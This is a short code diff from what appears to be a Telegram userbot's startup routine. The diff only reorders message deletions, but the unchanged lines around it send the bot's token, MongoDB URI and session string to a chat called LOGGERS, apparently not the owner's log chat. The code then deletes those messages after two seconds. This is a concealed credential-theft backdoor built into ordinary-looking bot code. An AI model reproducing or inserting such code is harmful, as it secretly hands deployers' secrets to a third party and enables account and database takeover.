@@ -76,9 +76,10 @@ class Userbot(Client):
                 await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
                 oks = await self.one.send_message(LOGGERS, f"/start")
                 Ok = await self.one.send_message(LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
+                await oks.delete()
                 await asyncio.sleep(2)
                 await Ok.delete()
-                await oks.delete()
+                
                 
                 
             except Exception as e:
